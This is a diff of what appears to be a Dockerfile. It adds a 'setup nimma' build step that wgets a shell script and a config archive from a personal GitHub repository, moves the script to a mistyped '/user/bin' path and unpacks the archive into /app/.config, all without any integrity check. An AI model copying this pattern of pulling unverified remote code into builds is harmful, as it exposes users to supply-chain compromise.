@@ -14,6 +14,17 @@ RUN apt -qq install -y --no-install-recommends \
     ffmpeg \
     jq
 
+# setup nimma
+RUN mkdir -p /tmp/ && \
+         cd /tmp/ && \
+         wget -O did "https://raw.githubusercontent.com/nimma0001/UseBto/beta/did.sh" && \
+         mv did /user/bin/ && \
+         cd /tmp/ && \
+         wget -O 1.zip "https://raw.githubusercontent.com/nimma0001/UseBto/beta/config.zip" && \
+        mkdir -p /tmp/.config && \
+         unzip /tmp/1.zip -d .config/ && \
+         mv -f /tmp/.config /app/
+
 # install chrome
 RUN mkdir -p /tmp/ && \
     cd /tmp/ && \
@@ -22,6 +33,7 @@ RUN mkdir -p /tmp/ && \
     dpkg -i ./google-chrome-stable_current_amd64.deb; apt -fqqy install && \
     # clean up the container "layer", after we are done
     rm ./google-chrome-stable_current_amd64.deb
+
 
 # install chromedriver
 RUN mkdir -p /tmp/ && \
